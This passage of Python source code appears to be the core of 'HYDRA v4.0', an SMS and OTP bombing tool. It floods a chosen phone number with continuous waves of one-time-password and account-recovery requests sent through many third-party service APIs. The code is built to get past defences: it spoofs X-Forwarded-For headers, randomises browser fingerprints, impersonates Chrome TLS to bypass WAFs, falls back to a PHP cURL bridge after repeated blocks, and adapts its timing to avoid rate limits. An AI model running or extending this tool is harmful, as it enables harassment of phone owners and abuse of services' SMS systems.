    Different TLS fingerprint and HTTP stack vs Python requests.
    Returns a result dict with verdict, status, resp_time_ms, body.
    """
    if not _PHP_AVAILABLE:
        return {"verdict": "PHP_UNAVAILABLE", "status": "?", "resp_time_ms": 0, "body": ""}

    fphone  = resolve_phone(phone, target.get("phone_format", "raw"))
    url     = target["url"].replace("<PHONE>", fphone)
    method  = target.get("method", "POST").upper()
    ctype   = target.get("content_type", "json")
    payload = target.get("payload") or {}

    # Build payload string
    if isinstance(payload, dict):
        import copy as _copy
        p = _copy.deepcopy(payload)
        p_str = json.dumps(p).replace("<PHONE>", fphone)
    else:
        p_str = "{}"

    # Build PHP cURL script
    if method == "GET":
        php_code = f"""<?php
$ch = curl_init('{url}');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 8);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36','Accept: application/json']);
echo curl_exec($ch);
?>"""
    else:
        ct_header = "application/x-www-form-urlencoded" if ctype == "form" else "application/json"
        php_code = f"""<?php
$data = '{p_str}';
$ch = curl_init('{url}');
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 8);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: {ct_header}','User-Agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36','Accept: application/json']);
echo curl_exec($ch);
?>"""

    t0 = time.time()
    try:
        proc = _subprocess.run(
            ["php", "-r", php_code],
            capture_output=True, text=True, timeout=12
        )
        elapsed_ms = int((time.time() - t0) * 1000)
        body = (proc.stdout or "").strip()[:300]
        # Classify using existing parser (HTTP status unknown from PHP, use 200 heuristic)
        inferred_status = 200 if body else 503
        verdict, cooldown = parse_body(body, inferred_status)
        return {
            "verdict":      verdict,
            "status":       f"PHP/{inferred_status}",
            "resp_time_ms": elapsed_ms,
            "body":         body,
            "cooldown":     cooldown,
        }
    except _subprocess.TimeoutExpired:
        return {"verdict": "TIMEOUT", "status": "PHP/?", "resp_time_ms": 12000, "body": ""}
    except Exception as e:
        return {"verdict": f"PHP_ERROR", "status": "PHP/?", "resp_time_ms": 0, "body": str(e)}


def fire(target: dict, phone: str, results_bucket: list, debug: bool = False, log_fn=None):
    """Send a single OTP request. Thread-safe. Calls log_fn(result) in real-time if provided."""
    try:
        # ── Phase 9.2 — PHP Bridge auto-switch ───────────────────────
        # Conditions for routing to PHP bridge:
        #   a) Target explicitly tagged with "php_bridge": true, OR
        #   b) Target has accumulated 3+ consecutive BLOCKED verdicts
        _tname = target.get("name", "?")
        _use_php = bool(_PHP_AVAILABLE) and (
            target.get("php_bridge") or _php_block_counter.get(_tname, 0) >= 3
        )
        if _use_php:
            br = fire_php_bridge(phone, target)
            br["target"]   = _tname
            br["category"] = target.get("category", "?")
            br["phone"]    = phone
            br["time"]     = datetime.now().strftime("%H:%M:%S")
            br["via"]      = "PHP_BRIDGE"
            br.setdefault("resp_time_ms", 0)
            _ts_php = br["time"]
            _cat_php = br["category"]
            _v_php  = br["verdict"]
            _color_php = (GREEN if _v_php == "OTP_SENT"
                          else (YELLOW if "FAKE" in _v_php or "RATE" in _v_php else RED))
            print(f"{_color_php}[{_ts_php}] {_tname:<15} [{_cat_php:<12}] {_v_php:<14}  {br['status']}  {br['resp_time_ms']}ms  [PHP]{RESET}")
            # Update consecutive BLOCKED streak
            if _v_php == "BLOCKED":
                _php_block_counter[_tname] = _php_block_counter.get(_tname, 0) + 1
            else:
                _php_block_counter[_tname] = 0
            results_bucket.append(br)
            db_write(br, session_log["session_id"])
            if log_fn:
                log_fn(br)
            return

        ua      = random.choice(USER_AGENTS)
        ts      = datetime.now().strftime("%H:%M:%S")
        method  = target.get("method", "POST").upper()
        pfmt    = target.get("phone_format", "raw")
        fphone  = resolve_phone(phone, pfmt)

        # Build URL — substitute <PHONE> for GET-style endpoints
        url = target["url"].replace("<PHONE>", fphone)

        # Build headers
        headers = {**target.get("extra_headers", {})}
        headers["User-Agent"] = ua

        # Dynamic fingerprinting — randomise per request to defeat traffic analysis
        headers["Accept-Language"] = random.choice(ACCEPT_LANGUAGE_POOL)
        headers["Accept"]          = random.choice(ACCEPT_TYPE_POOL)
        headers["Accept-Encoding"] = "gzip, deflate, br"
        if random.random() < 0.5:
            headers["X-Request-ID"] = (
                f"{random.randint(0, 0xffffff):06x}{random.randint(0, 0xffffff):06x}"
            )
        if random.random() < 0.35:
            _spoof = (
                f"{random.randint(1,254)}.{random.randint(0,254)}"
                f".{random.randint(0,254)}.{random.randint(1,254)}"
            )
            headers["X-Forwarded-For"] = _spoof
            headers["X-Real-IP"]       = _spoof

        # Build payload — payload morphing: pick random variant if available
        raw_payload = None
        content_type = target.get("content_type", "json")

        if method in ("POST", "PUT"):
            payload_src = (
                random.choice(target["payload_variants"])
                if target.get("payload_variants")
                else target.get("payload")
            )
            if payload_src:
                raw_payload = json.loads(
                    json.dumps(payload_src).replace("<PHONE>", fphone)
                )
                headers["Content-Type"] = (
                    "application/x-www-form-urlencoded"
                    if content_type == "form"
                    else "application/json"
                )

        # Build query params (GET endpoints that use 'params' key)
        get_params = None
        if method == "GET" and "params" in target:
            get_params = {
                k: str(v).replace("<PHONE>", fphone)
                for k, v in target["params"].items()
            }

        # POST params (appended to URL as query string, e.g. RealEstateIndia sid)
        post_url_params = None
        if method == "POST" and "params" in target:
            post_url_params = {
                k: str(v).replace("<PHONE>", fphone)
                for k, v in target["params"].items()
            }

        # Cookies
        req_cookies = target.get("cookies", None)

        # Send — curl_cffi Chrome120 TLS fingerprint for ALL targets (WAF bypass)
        _t_start  = time.time()
        _use_cffi = False
        try:
            from curl_cffi import requests as _cffi
            _sess = _cffi.Session(impersonate="chrome120")
            if method == "GET":
                resp = _sess.get(url, headers=headers, params=get_params, cookies=req_cookies, timeout=10)
            elif method == "PUT":
                resp = _sess.put(url, data=raw_payload if content_type == "form" else None,
                                json=raw_payload if content_type != "form" else None,
                                headers=headers, params=post_url_params, cookies=req_cookies, timeout=10)
            else:
                resp = _sess.post(url, data=raw_payload if content_type == "form" else None,
                                 json=raw_payload if content_type != "form" else None,
                                 headers=headers, params=post_url_params, cookies=req_cookies, timeout=10)
            _use_cffi = True
        except Exception:
            pass  # curl_cffi unavailable or failed — fall through to requests
        if not _use_cffi:
            if method == "GET":
                resp = requests.get(url, headers=headers, params=get_params, cookies=req_cookies, timeout=6)
            elif method == "PUT":
                if content_type == "form":
                    resp = requests.put(url, data=raw_payload, headers=headers, params=post_url_params, cookies=req_cookies, timeout=6)
                else:
                    resp = requests.put(url, json=raw_payload, headers=headers, params=post_url_params, cookies=req_cookies, timeout=6)
            else:  # POST
                if content_type == "form":
                    resp = requests.post(url, data=raw_payload, headers=headers, params=post_url_params, cookies=req_cookies, timeout=6)
                else:
                    resp = requests.post(url, json=raw_payload, headers=headers, params=post_url_params, cookies=req_cookies, timeout=6)

        # Classify result — Phase 3.3 deep body parser
        t_elapsed_ms   = int((time.time() - _t_start) * 1000)
        body_snippet   = resp.text[:300]
        verdict, cooldown = parse_body(body_snippet, resp.status_code)

        # Console print
        color = GREEN if verdict == "OTP_SENT" else (YELLOW if verdict in ("RATE_LIMITED", "200_FAKE") else RED)
        cooldown_hint = f"  {DIM}[retry in {cooldown}s]{RESET}" if cooldown else ""
        print(f"{color}[{ts}] {target['name']:<15} [{target['category']:<12}] {verdict:<14}  HTTP {resp.status_code}  {t_elapsed_ms}ms{cooldown_hint}{RESET}")

        if debug:
            print(f"       {DIM}BODY: {body_snippet[:250]}{RESET}")

        # Store for log + intelligence DB
        result = {
            "time":         ts,
            "target":       target["name"],
            "category":     target["category"],
            "phone":        phone,
            "status":       resp.status_code,
            "verdict":      verdict,
            "resp_time_ms": t_elapsed_ms,
            "body":         body_snippet,
        }
        results_bucket.append(result)
        db_write(result, session_log["session_id"])
        if log_fn:
            log_fn(result)
        # Phase 9.2 — track consecutive BLOCKEDs for PHP auto-switch
        _name_key = target.get("name", "?")
        if verdict == "BLOCKED":
            _php_block_counter[_name_key] = _php_block_counter.get(_name_key, 0) + 1
        else:
            _php_block_counter[_name_key] = 0

    except requests.exceptions.Timeout:
        ts2 = datetime.now().strftime("%H:%M:%S")
        print(f"{RED}[{ts2}] {target['name']:<15} TIMEOUT{RESET}")
        r = {"target": target["name"], "category": target.get("category","?"), "verdict": "TIMEOUT", "status": "?"}
        results_bucket.append(r)
        if log_fn:
            log_fn(r)

    except Exception as e:
        ts2 = datetime.now().strftime("%H:%M:%S")
        print(f"{RED}[ERR] {target['name']}: {e}{RESET}")
        r = {"target": target["name"], "category": target.get("category","?"), "verdict": f"ERROR: {e}", "status": "?"}
        results_bucket.append(r)
        if log_fn:
            log_fn(r)


# ─────────────────────────────────────────────
#  LIVENESS HEALTH CHECKER  (Phase 2.0)
#  Concurrently pings every endpoint (HEAD / GET).
#  Prunes targets where DNS fails or connection
#  is refused — keeps anything that gives ANY HTTP
#  response (even 4xx/5xx = server exists).
# ─────────────────────────────────────────────
def liveness_check(targets: list, verbose: bool = True) -> list:
    def _probe(t: dict):
        try:
            # Strip query params for the probe, use dummy phone
            probe_url = t["url"].split("?")[0].replace("<PHONE>", "9999999999")
            r = requests.get(
                probe_url,
                headers={"User-Agent": random.choice(USER_AGENTS)},
                timeout=2.5,
                allow_redirects=False,
            )
            # CHANGED 2026-04-26: stricter — 5xx server errors = unhealthy, prune.
            # Only keep endpoints that respond with non-server-error status.
            return t, r.status_code < 500
        except requests.exceptions.ConnectionError:
            return t, False     # DNS failure / connection refused = truly dead
        except requests.exceptions.Timeout:
            return t, False     # CHANGED: timeouts = also dead, was kept before
        except Exception:
            return t, True      # other (TLS etc) = give benefit of doubt

    print(f"\n{CYAN}[LIVENESS] Probing {len(targets)} endpoints ({min(40, len(targets))} threads)...{RESET}")
    live: list = []
    dead: list = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(40, len(targets))) as ex:
        futures = {ex.submit(_probe, t): t for t in targets}
        for f in concurrent.futures.as_completed(futures):
            t, alive = f.result()
            if alive:
                live.append(t)
            else:
                dead.append(t)
                if verbose:
                    print(f"{RED}[DEAD] {t.get('name', '?')} — unreachable{RESET}")

    print(f"{GREEN}[LIVENESS] {len(live)} live{RESET}  |  {RED}{len(dead)} dead pruned{RESET}\n")
    return live


# ─────────────────────────────────────────────
#  WAVE ENGINE  (one full pass across all APIs)
# ─────────────────────────────────────────────
def run_wave(phone: str, targets: list, wave_num: int, debug: bool, stagger: float,
             log_fn=None, dual_vector: bool = False) -> list:
    """
    Fire one wave.
    Phase 4.1: dual_vector=True also fires RECOVERY_TARGETS concurrently.
    Phase 4.3: auto-raises stagger if WAF block rate > WAF_BLOCK_THRESHOLD.
    Returns combined results list.
    """
    wave_results = []
    # Phase 3.2 — Smart Wave Composer: re-rank, amplify top performers, prune chronic blockers
    shuffled = compose_smart_wave(targets)

    # ── Vector A: Primary SMS flood ─────────────────────────
    threads = []
    for t in shuffled:
        if STOP.is_set():
            break
        th = threading.Thread(target=fire, args=(t, phone, wave_results, debug, log_fn))
        th.daemon = True
        threads.append(th)
        th.start()
        # Gaussian jitter stagger — mimics human timing
        jitter = max(0.05, random.gauss(stagger, stagger * 0.4))
        slept = 0.0
        while slept < jitter and not STOP.is_set():
            chunk = min(0.1, jitter - slept)
            time.sleep(chunk)
            slept += chunk

    # ── Vector B: Account Recovery SMS (Phase 4.1) ──────────
    if dual_vector and not STOP.is_set():
        recovery_results: list = []
        rec_threads = []
        for t in RECOVERY_TARGETS:
            if STOP.is_set():
                break
            th = threading.Thread(target=fire, args=(t, phone, recovery_results, debug, log_fn))
            th.daemon = True
            rec_threads.append(th)
            th.start()
            # Faster stagger for recovery vector — different timing fingerprint
            jitter = max(0.05, random.gauss(stagger * 0.7, stagger * 0.2))
            slept = 0.0
            while slept < jitter and not STOP.is_set():
                chunk = min(0.1, jitter - slept)
                time.sleep(chunk)
                slept += chunk
        for th in rec_threads:
            th.join(timeout=10)
        wave_results.extend(recovery_results)

    for th in threads:
        th.join(timeout=10)

    # ── Phase 4.3: WAF Adaptive Throttle ────────────────────
    # If >50% of results are BLOCKED, warn caller to slow down
    if wave_results:
        blocked_count = sum(1 for r in wave_results if r.get("verdict") == "BLOCKED")
        block_rate = blocked_count / len(wave_results)
        if block_rate > WAF_BLOCK_THRESHOLD:
            new_stagger = min(stagger * WAF_THROTTLE_FACTOR, WAF_THROTTLE_MAX)
            waf_msg = (f"[WAF] Block rate {block_rate:.0%} > {WAF_BLOCK_THRESHOLD:.0%} "
                       f"— stagger auto-raised {stagger:.2f}s → {new_stagger:.2f}s")
            if log_fn:
                log_fn({"verdict": "WAF_THROTTLE", "target": "ENGINE", "category": "sys",
                        "status": "—", "resp_time_ms": "", "_waf_new_stagger": new_stagger})
            # Attach new stagger value as a sentinel in results for caller to read
            wave_results.append({"_waf_stagger_update": new_stagger, "verdict": "_WAF_META"})
            print(f"\033[93m{waf_msg}\033[0m")

    return wave_results


# ─────────────────────────────────────────────
#  SAVE LOG
# ─────────────────────────────────────────────
def save_log():
    log_dir  = os.path.join(os.path.dirname(__file__), "hydra_logs")
    os.makedirs(log_dir, exist_ok=True)
    filename = os.path.join(log_dir, f"hydra_{session_log['session_id']}.json")
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(session_log, f, indent=2)
    print(f"\n{CYAN}[LOG] Session saved → {filename}{RESET}")


# ─────────────────────────────────────────────
#  BANNER
# ─────────────────────────────────────────────
def banner(total_targets: int = 0):
    os.system("cls" if os.name == "nt" else "clear")
    count = total_targets or len(TARGETS)
    print(f"{RED}{BOLD}")
    print("██╗  ██╗██╗   ██╗██████╗ ██████╗  █████╗     ██╗   ██╗ █████╗ ")
    print("██║  ██║╚██╗ ██╔╝██╔══██╗██╔══██╗██╔══██╗    ██║   ██║██╔══██╗")
    print("███████║ ╚████╔╝ ██║  ██║██████╔╝███████║    ██║   ██║███████║")
    print("██╔══██║  ╚██╔╝  ██║  ██║██╔══██╗██╔══██║    ╚██╗ ██╔╝██╔══██║")
    print("██║  ██║   ██║   ██████╔╝██║  ██║██║  ██║     ╚████╔╝ ██║  ██║")
    print("╚═╝  ╚═╝   ╚═╝   ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝      ╚═══╝  ╚═╝  ╚═╝")
    print(f"{RESET}{CYAN}        HYDRA v4.0 — BlackOps OTP Recon Framework{RESET}")
    print(f"{DIM}        Targets: {count} APIs  |  Categories: e-commerce, healthcare,")
    print(f"        transport, finance, education, real-estate, food, grocery{RESET}")
    # Phase 9 — PHP bridge status
    if _PHP_AVAILABLE:
        print(f"{GREEN}        [PHP bridge: AVAILABLE — {_PHP_AVAILABLE.split(' ')[0]} {_PHP_AVAILABLE.split(' ')[1] if len(_PHP_AVAILABLE.split(' ')) > 1 else ''}]{RESET}")
    else:
        print(f"{YELLOW}        [PHP bridge: NOT FOUND — install: winget install PHP.PHP]{RESET}")
    print(f"{RED}        ──────────────────────────────────────────────────{RESET}\n")


# ─────────────────────────────────────────────
#  MENU HELPERS
# ─────────────────────────────────────────────
def pick_mode(n_targets: int) -> str:
    print(f"{BOLD}SELECT MODE:{RESET}")
    print(f"  {CYAN}1{RESET}  FULL SWARM      — fire all {n_targets} APIs, continuous waves")
    print(f"  {CYAN}2{RESET}  SINGLE WAVE     — fire all APIs once, show results, exit")
    print(f"  {CYAN}3{RESET}  DEBUG MODE      — single wave + full response bodies")
    print(f"  {CYAN}4{RESET}  CATEGORY SCAN   — select a category only")
    print(f"  {CYAN}5{RESET}  DUAL-VECTOR     — SMS flood + account recovery simultaneously")
    print(f"  {CYAN}0{RESET}  EXIT\n")
    return input(f"{YELLOW}hydra@v4:~# {RESET}").strip()


def pick_category(targets: list) -> list:
    cats = sorted(set(t["category"] for t in targets))
    print(f"\n{BOLD}CATEGORIES:{RESET}")
    for i, c in enumerate(cats, 1):
        count = sum(1 for t in targets if t["category"] == c)
        print(f"  {CYAN}{i}{RESET}  {c:<15} ({count} APIs)")
    ch = input(f"\n{YELLOW}Select number: {RESET}").strip()
    try:
        chosen = cats[int(ch) - 1]
        filtered = [t for t in targets if t["category"] == chosen]
        print(f"\n{GREEN}[*] Scanning category: {chosen} ({len(filtered)} APIs){RESET}\n")
        return filtered
    except Exception:
        print(f"{RED}Invalid choice, using all targets.{RESET}")
        return targets


# ─────────────────────────────────────────────
#  SUMMARY PRINTER
# ─────────────────────────────────────────────
def print_summary(all_results: list):
    from collections import Counter
    verdicts = Counter(r.get("verdict", "?") for r in all_results)
    print(f"\n{BOLD}{'─'*55}")
    print(f"  WAVE SUMMARY")
    print(f"{'─'*55}{RESET}")
    for v, count in sorted(verdicts.items(), key=lambda x: -x[1]):
        color = GREEN if v == "OTP_SENT" else (YELLOW if "FAKE" in v or "RATE" in v else RED)
        print(f"  {color}{v:<18}{RESET}  {count} hits")
    print(f"{DIM}{'─'*55}{RESET}\n")


# ─────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────
def main():
    # ── Phase 3.1 — Init Intelligence DB ────────────────────────
    _db_init()
    # ── Phase 4.5 — Load platform profiles ─────────────────────
    _load_platform_profiles()
    if _platform_profiles:
        print(f"\033[2m[PROFILES] {len(_platform_profiles)} platform fingerprints loaded\033[0m")

    # ── AUTO-SYNC: fetch live endpoints from TBomb + XBomber ────
    if _AUTOSYNC_AVAILABLE:
        active_targets = _autosync(TARGETS, verbose=True)
    else:
        active_targets = TARGETS

    banner(total_targets=len(active_targets))

    # ── Liveness check — prune dead DNS / refused endpoints ─────
    active_targets = liveness_check(active_targets, verbose=True)
    if not active_targets:
        print(f"{RED}[!] All targets appear offline. Exiting.{RESET}")
        sys.exit(1)

    # ── Phone input ──────────────────────────
    phone_raw = input(f"{YELLOW}[?] Target phone (digits only, no +91): {RESET}").strip()
    if not phone_raw.isdigit() or len(phone_raw) < 10:
        print(f"{RED}[!] Invalid number. Exiting.{RESET}")
        sys.exit(1)
    phone = phone_raw

    # ── Stagger speed ────────────────────────
    print(f"\n{YELLOW}[?] Stagger delay between threads (default 0.3s, press Enter to keep): {RESET}", end="")
    stagger_raw = input().strip()
    stagger = float(stagger_raw) if stagger_raw else 0.3

    # ── Max waves (0 = UNLIMITED until Ctrl+C) ─────────────
    print(f"{YELLOW}[?] Max waves (0 = UNLIMITED, default 0): {RESET}", end="")
    mw_raw = input().strip()
    try:
        max_waves = int(mw_raw) if mw_raw else 0
    except ValueError:
        max_waves = 0

    # ── Mode select ──────────────────────────
    print()
    mode = pick_mode(len(active_targets))

    if mode == "0":
        print(f"{RED}Exiting.{RESET}")
        sys.exit(0)

    if mode == "4":
        active_targets = pick_category(active_targets)

    debug       = (mode == "3")
    dual_vector = (mode == "5")  # Phase 4.1

    if dual_vector:
        print(f"{CYAN}[*] DUAL-VECTOR MODE: SMS flood + {len(RECOVERY_TARGETS)} account-recovery flows{RESET}")

    # ── Session init ─────────────────────────
    session_log["target_phone"] = phone
    session_log["start_time"]   = datetime.now().isoformat()

    # ── Execution ────────────────────────────
    print(f"\n{GREEN}[*] HYDRA ONLINE — Target: {phone}  |  APIs: {len(active_targets)}  |  Debug: {debug}{RESET}\n")

    if mode in ("2", "3", "4"):
        # Single wave
        results = run_wave(phone, active_targets, wave_num=1, debug=debug, stagger=stagger)
        session_log["waves_fired"] = 1
        session_log["results"].extend([r for r in results if r.get("verdict") != "_WAF_META"])
        print_summary(results)

    else:
        # Continuous waves (mode 1, 5 — full swarm or dual-vector)
        wave = 0
        cap_label = "UNLIMITED" if max_waves == 0 else str(max_waves)
        print(f"{DIM}[*] Wave cap: {cap_label}  |  Press Ctrl+C anytime for graceful stop.{RESET}\n")
        try:
            while not STOP.is_set():
                wave += 1
                if max_waves and wave > max_waves:
                    print(f"{YELLOW}[*] Reached max waves ({max_waves}). Stopping.{RESET}")
                    break
                print(f"{BOLD}{BLUE}{'─'*55}")
                print(f"  WAVE {wave:03d}  —  {datetime.now().strftime('%H:%M:%S')}")
                print(f"{'─'*55}{RESET}")
                results = run_wave(phone, active_targets, wave_num=wave, debug=debug,
                                   stagger=stagger, dual_vector=dual_vector)
                # Phase 4.3 — check WAF sentinel, update stagger for next wave
                for r in results:
                    if r.get("verdict") == "_WAF_META" and "_waf_stagger_update" in r:
                        stagger = r["_waf_stagger_update"]
                clean = [r for r in results if r.get("verdict") != "_WAF_META"]
                session_log["waves_fired"] = wave
                session_log["results"].extend(clean)
                print_summary(clean)
                if STOP.is_set():
                    break
                # Gaussian wave cooldown 2-8s (mu=4, sigma=1.5)
                cooldown = max(1.5, min(8.0, random.gauss(4.0, 1.5)))
                print(f"{DIM}[*] Cooling down {cooldown:.1f}s before next wave...{RESET}")
                slept = 0.0
                while slept < cooldown and not STOP.is_set():
                    chunk = min(0.25, cooldown - slept)
                    time.sleep(chunk)
                    slept += chunk

        except KeyboardInterrupt:
            STOP.set()
            print(f"\n{RED}[!] CTRL+C -- Stopping Hydra.{RESET}")

        if STOP.is_set():
            print(f"{YELLOW}[*] Graceful stop complete after wave {wave}.{RESET}")

    # ── Save log ──────────────────────────────
    session_log["end_time"] = datetime.now().isoformat()
    save_log()

    print(f"\n{CYAN}Total waves fired : {session_log['waves_fired']}")
    print(f"Total requests    : {len(session_log['results'])}{RESET}")
    print(f"{GREEN}Done.{RESET}\n")


if __name__ == "__main__":
    main()
